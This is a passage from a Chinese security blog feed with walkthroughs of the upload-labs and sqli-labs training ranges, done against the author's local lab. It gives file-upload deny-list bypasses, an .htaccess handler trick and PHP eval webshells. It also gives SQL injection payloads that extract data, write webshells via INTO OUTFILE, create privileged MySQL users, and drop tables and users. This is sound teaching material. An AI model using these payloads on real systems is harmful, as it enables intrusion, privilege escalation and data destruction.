函数将上传的文件移动到新位置。</p><p>若成功，则返回 true，否则返回 false。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>file</em></td><td>必需。规定要移动的文件。</td></tr><tr><td><em>newloc</em></td><td>必需。规定文件的新位置。</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(file,newloc)</span><br></pre></td></tr></table></figure><p>本函数检查并确保由 <em>file</em> 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 <em>newloc</em> 指定的文件。</p><p>如果 <em>file</em> 不是合法的上传文件，不会出现任何操作，move_uploaded_file () 将返回 false。</p><p>如果 <em>file</em> 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file () 将返回 false，此外还会发出一条警告。</p><h2 id="pass-03"><a class="markdownIt-Anchor" href="#pass-03">#</a> Pass-03</h2><p>查看源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从源码中我们可以看出设定了黑名单，’.asp’,’.aspx’,’.php’,’.jsp’后缀的文件都不允许上传，并且会检查大小写、删除点和空格。</p><p>想要绕过黑名单可以使用脚本的其他拓展名。</p><p>这里我想要上传一个’.php’后缀的文件，所以列举一些 php 文件的其他拓展名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php .phtml .phps .php3 .php4 .php5 .pht</span><br></pre></td></tr></table></figure><p>直接把带有一句话木马的 php 文件改为 php5 文件上传</p><p>连接蚁剑</p><p>在使用小皮面板的时候一直不可以解析 php5，搞了我一个多小时不行… 我直接换成 phpstudy2018，教程如下</p><p><a href="https://blog.csdn.net/weixin_44023693/article/details/104754029">(1 条消息) 31. phpstudy 无法解析 php2、php3、phtml 等文件_phpstudy 不解析 php___Qian 的博客 - CSDN 博客</a></p><h2 id="pass-04"><a class="markdownIt-Anchor" href="#pass-04">#</a> Pass-04</h2><p>本关把 php、jsp 等等所有后缀名全过滤了，这个时候我们需要引进一个.htaccess 文件</p><blockquote><p><strong>htaccess 文件是 Apache 服务器中的一个配置文件，他负责相关目录下的网页配置。通过 htaccess 文件，可以帮助我们实现：网页 301 重定向，自定义 404 错误页面，改变文件扩展名，允许或组织特定的用户或者，目录的访问，禁止目录列表，配置默认文档等功能。</strong></p><p>其中.htaccess 文件内容:<strong>SetHandler application/x-httpd-php</strong> 设置当前目录所有文件都使用 PHP 解析，无论上传任何文件，只要符合 php 语言代码规范，就会被当做 php 文件执行。</p></blockquote><p>新建一个文本，输入内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;uploadlabs04.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>代码中 uploadlabs04.png 会被解析为 php 文件</p><p>重命名为.htaccess</p><p>**PS：** 这里需要将上传的文件不用前缀 即.htaccess</p><p>先上传.htaccess</p><p>然后上传一句话木马图片，接着蚁剑连接就 ok 了</p><h2 id="pass-05"><a class="markdownIt-Anchor" href="#pass-05">#</a> Pass-05</h2><h2 id="pass-06"><a class="markdownIt-Anchor" href="#pass-06">#</a> Pass-06</h2><h2 id="pass-07"><a class="markdownIt-Anchor" href="#pass-07">#</a> Pass-07</h2><h2 id="pass-08"><a class="markdownIt-Anchor" href="#pass-08">#</a> Pass-08</h2><h2 id="pass-09"><a class="markdownIt-Anchor" href="#pass-09">#</a> Pass-09</h2><h2 id="pass-10"><a class="markdownIt-Anchor" href="#pass-10">#</a> Pass-10</h2><h2 id="pass-11"><a class="markdownIt-Anchor" href="#pass-11">#</a> Pass-11</h2><h2 id="pass-12"><a class="markdownIt-Anchor" href="#pass-12">#</a> Pass-12</h2><h2 id="pass-13"><a class="markdownIt-Anchor" href="#pass-13">#</a> Pass-13</h2><h2 id="pass-14"><a class="markdownIt-Anchor" href="#pass-14">#</a> Pass-14</h2><h2 id="pass-15"><a class="markdownIt-Anchor" href="#pass-15">#</a> Pass-15</h2><h2 id="pass-16"><a class="markdownIt-Anchor" href="#pass-16">#</a> Pass-16</h2><h2 id="pass-17"><a class="markdownIt-Anchor" href="#pass-17">#</a> Pass-17</h2><h2 id="pass-18"><a class="markdownIt-Anchor" href="#pass-18">#</a> Pass-18</h2><h2 id="pass-19"><a class="markdownIt-Anchor" href="#pass-19">#</a> Pass-19</h2><h2 id="pass-20"><a class="markdownIt-Anchor" href="#pass-20">#</a> pass-20</h2><h2 id="pass-21"><a class="markdownIt-Anchor" href="#pass-21">#</a> pass-21</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;upload-labs 是一个使用 &lt;code&gt;php&lt;/code&gt;  语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2023/04/05/upload-labs/1.png&quot; alt&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="https://dr4x3zz.github.io/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="https://dr4x3zz.github.io/tags/upload-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs-46-53</title>
    <link href="https://dr4x3zz.github.io/2023/03/31/sqli-labs-46-53/"/>
    <id>https://dr4x3zz.github.io/2023/03/31/sqli-labs-46-53/</id>
    <published>2023-03-31T13:01:07.000Z</published>
    <updated>2023-04-04T15:02:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs-46-53"><a class="markdownIt-Anchor" href="#sqli-labs-46-53">#</a> sqli-labs-46-53</h1><span id="more"></span><h2 id="sqli-labs-46"><a class="markdownIt-Anchor" href="#sqli-labs-46">#</a> sqli-labs-46</h2><p><img src="/2023/03/31/sqli-labs-46-53/1.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>Please input parameter as SORT with numeric value</p><p>请输入参数作为带有数值的排序</p><p>试用 sort 分别取 1，2，3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=1</span><br></pre></td></tr></table></figure><p><img src="/2023/03/31/sqli-labs-46-53/2.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=2</span><br></pre></td></tr></table></figure><p><img src="/2023/03/31/sqli-labs-46-53/3.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=3</span><br></pre></td></tr></table></figure><p><img src="/2023/03/31/sqli-labs-46-53/4.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>显而易见，出现的表格是根据 sort 后面的值表示的列来排序的</p><p>添加单引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=3&#x27;</span><br></pre></td></tr></table></figure><p>页面报错</p><p><img src="/2023/03/31/sqli-labs-46-53/5.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>本关无闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=3 and sleep(5)</span><br></pre></td></tr></table></figure><p>使用之间注入验证一下</p><p>有明显的延迟</p><p>确实无闭合</p><p>直接使用报错注入</p><p>获取用户 user</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=3 and updatexml(1,concat(0x7e,user(),0x7e),3)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/31/sqli-labs-46-53/6.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>爆库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=3 and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),3)</span><br></pre></td></tr></table></figure><p>因为限制以此类推，直至获取所有数据库名称</p><p><img src="/2023/03/31/sqli-labs-46-53/7.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>之后获取表名啊字段名啊什么的就不一一列举了</p><p>这里尝试写入 webshell 并链接蚁剑</p><p>先用字符串转 16 进制</p><p>讲一句话木马转换成 16 进制数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;46&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>0x3c3f70687020406576616c28245f504f53545b273436275d293b3f3e</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=3 into outfile &#x27;D:/phpstudy/www/46.php&#x27; lines terminated by 0x3c3f70687020406576616c28245f504f53545b273436275d293b3f3e</span><br></pre></td></tr></table></figure><p>使用蚁剑连接一句话木马</p><p><img src="/2023/03/31/sqli-labs-46-53/8.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/03/31/sqli-labs-46-53/9.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>连接成功，可以直接访问了</p><h2 id="sqli-labs-47"><a class="markdownIt-Anchor" href="#sqli-labs-47">#</a> sqli-labs-47</h2><p>本关和上关大致相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/31/sqli-labs-46-53/10.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>闭合单引号就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=1&#x27; --+</span><br></pre></td></tr></table></figure><p>payload 就不一一列出了</p><h2 id="sqli-labs-48"><a class="markdownIt-Anchor" href="#sqli-labs-48">#</a> sqli-labs-48</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?sort=1&#x27;</span><br><span class="line">url?sort=1&quot;</span><br></pre></td></tr></table></figure><p>发现本关不报错，且没有查询结果，说明本关是数字型，无闭合</p><p>使用布尔注入或者其他盲注手段</p><h2 id="sqli-labs-49"><a class="markdownIt-Anchor" href="#sqli-labs-49">#</a> sqli-labs-49</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?sort=1&#x27;//有查询结果</span><br><span class="line">url?sort=1&quot;//无查询结果</span><br></pre></td></tr></table></figure><p>说明本关闭合包含<em><strong>单引号</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=1&#x27; --+</span><br></pre></td></tr></table></figure><p>验证是否闭合为单引号</p><p><img src="/2023/03/31/sqli-labs-46-53/11.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>闭合为单引号</p><p>获取当前数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=1&#x27; and substr((select database()),1,8)=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><h2 id="sqli-labs-50"><a class="markdownIt-Anchor" href="#sqli-labs-50">#</a> sqli-labs-50</h2><p>本关题目说是堆叠注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/31/sqli-labs-46-53/12.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>无闭合</p><p>堆叠注入写 webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=1;select &#x27;&lt;?php @eval($_POST[&#x27;less50&#x27;]);?&gt;&#x27; into outfile &#x27;D:/phpstudy/www/less50.php&#x27;</span><br></pre></td></tr></table></figure><p>配合蚁剑</p><h2 id="sqli-labs-51"><a class="markdownIt-Anchor" href="#sqli-labs-51">#</a> sqli-labs-51</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/31/sqli-labs-46-53/13.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>单引号闭合</p><p>堆叠注入</p><p>尝试新建一个用户</p><p>这里学习一些相关知识</p><p><img src="/2023/03/31/sqli-labs-46-53/14.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/03/31/sqli-labs-46-53/15.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/03/31/sqli-labs-46-53/16.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/03/31/sqli-labs-46-53/17.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这样就比能理解这个语句的意思了</p><p>学习链接：<a href="https://blog.csdn.net/paullinjie/article/details/80340145">https://blog.csdn.net/paullinjie/article/details/80340145</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=1&#x27;;CREATE USER &#x27;tongzheng&#x27;@&#x27;localhost&#x27;;GRANT ALL PRIVILEGES ON *.* TO &#x27;tongzheng&#x27;@&#x27;localhost&#x27;;--+</span><br></pre></td></tr></table></figure><p>这样就新建成功了 tongzheng 用户，且拥有除 Grant Option 之外的所有权限</p><p><em>GRANT OPTION，用户被授予了某个权限，那么默认情况下，该用户是不能把这个权限授予给其他人的。</em></p><p><img src="/2023/03/31/sqli-labs-46-53/18.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="sqli-labs-52"><a class="markdownIt-Anchor" href="#sqli-labs-52">#</a> sqli-labs-52</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?sort=1&#x27;//无查询结果</span><br><span class="line">url?sort=1&quot;//无查询结果</span><br></pre></td></tr></table></figure><p>可知本关无闭合，数字型</p><p>上一关创建了用户 tongzheng 但是没有 grant option 权限，这关尝试堆叠注入授权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?sort=1;GRANT grant option ON *.* TO &#x27;tongzheng&#x27;@&#x27;localhost&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/31/sqli-labs-46-53/19.png" class="lazyload" data-srcset="/2023/03/31/sqli-labs-46-53/19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到用户 tongzheng 已经拥有 grant option 权限</p><h2 id="sqli-labs-53"><a class="markdownIt-Anchor" href="#sqli-labs-53">#</a> sqli-labs-53</h2><p>本关 sort=1 和 sort=1&quot; 都有查询结果，sort=1’没有查询结果，可以判断单引号闭合，其余的就和前面一样了，删除数据库用户指令可以参考这个 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.101.16/sqli-labs-master/Less-53/?sort=1&#x27;;DROP USER &#x27;xiannv&#x27;@&#x27;localhost&#x27;;-- s</span><br></pre></td></tr></table></figure><p>来源：<a href="https://blog.csdn.net/elephantxiang/article/details/120337529">https://blog.csdn.net/elephantxiang/article/details/120337529</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;sqli-labs-46-53&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sqli-labs-46-53&quot;&gt;#&lt;/a&gt; sqli-labs-46-53&lt;/h1&gt;</summary>
    
    
    
    <category term="sqli-labs" scheme="https://dr4x3zz.github.io/categories/sqli-labs/"/>
    
    
    <category term="sqli-labs" scheme="https://dr4x3zz.github.io/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs-41-45</title>
    <link href="https://dr4x3zz.github.io/2023/03/29/sqli-labs-41-45/"/>
    <id>https://dr4x3zz.github.io/2023/03/29/sqli-labs-41-45/</id>
    <published>2023-03-29T08:15:31.000Z</published>
    <updated>2023-03-31T09:46:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs-41-45"><a class="markdownIt-Anchor" href="#sqli-labs-41-45">#</a> sqli-labs-41-45</h1><span id="more"></span><h2 id="sqli-labs-41"><a class="markdownIt-Anchor" href="#sqli-labs-41">#</a> sqli-labs-41</h2><p>id=1有查询结果</p><p>id=1’无查询结果</p><p>id=1&quot;无查询结果</p><p>id=1 --+有查询结果</p><p>本关无闭合</p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113611.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113611.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查看源代码确实无闭合</p><p>直接进行堆叠注入</p><p>在 oblivion10 数据库下新建一个 test 表然后再删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1;use oblivion10;create table test(id int,user varchar(10)); --+</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113612.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113612.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>成功创建</p><p>尝试删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1;drop table oblivion10.test; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113613.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113613.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>成功删除表 test</p><h2 id="sqli-labs-42"><a class="markdownIt-Anchor" href="#sqli-labs-42">#</a> sqli-labs-42</h2><p>本关为 post 型</p><p>我们登录并且使用 bp 抓包</p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113614.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113614.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>那我们可以通过这个来更改 user admin 的密码，不过登录成功后也可以直接更改我觉得没什么必要更改这个用户的密码了</p><p>所以尝试更改 security 中其他用户的密码</p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113615.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113615.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>尝试更改 user stupid 的密码</p><p>bp 抓包，尝试闭合，发现本关是单引号闭合</p><p>更改密码</p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113616.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113616.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113617.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113617.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113618.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113618.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>成功</p><h2 id="sqli-labs-43"><a class="markdownIt-Anchor" href="#sqli-labs-43">#</a> sqli-labs-43</h2><p><em><strong>PHP mysqli_real_escape_string () 函数</strong></em></p><p>转义字符串中的特殊字符</p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113619.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113619.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>通过代码知道本关 password 是一个很明显的注入点</p><p>直接用 hackbar 来做这一道题，不过不能直接 load url，要直接提交至目标表单，再 load url 后面添加 login.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/login.php</span><br></pre></td></tr></table></figure><p>由于我没有重置数据库，我的 admin 用户的 password 为 qwe</p><p>添加单引号尝试闭合</p><p>在 post data 输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;&amp;mysubmit=Login</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113620.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113620.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113621.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113621.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>显而易见闭合为’)</p><p>之后对数据库的各种操作就不说了</p><h2 id="sqli-labs-44"><a class="markdownIt-Anchor" href="#sqli-labs-44">#</a> sqli-labs-44</h2><p>post 